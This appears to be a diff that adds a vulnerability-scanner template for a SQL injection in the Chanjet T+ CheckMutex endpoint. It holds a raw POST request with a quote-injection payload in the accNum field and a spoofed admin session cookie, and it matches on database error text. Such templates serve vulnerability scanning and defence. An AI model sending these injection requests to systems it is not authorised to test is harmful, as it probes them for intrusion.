@@ -1,0 +1,31 @@
+id: poc-yaml-chanjet-tplus-checkmutex-sqli
+info:
+  name: Tplus CheckMutex SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Cookie: ASP.NET_SessionId=; sid=admin; HOST=null;
+
+        {"accNum": "1'", "functionTag": "SYS0104", "url": ""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "order by begintime"
+          - "引号不完整"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
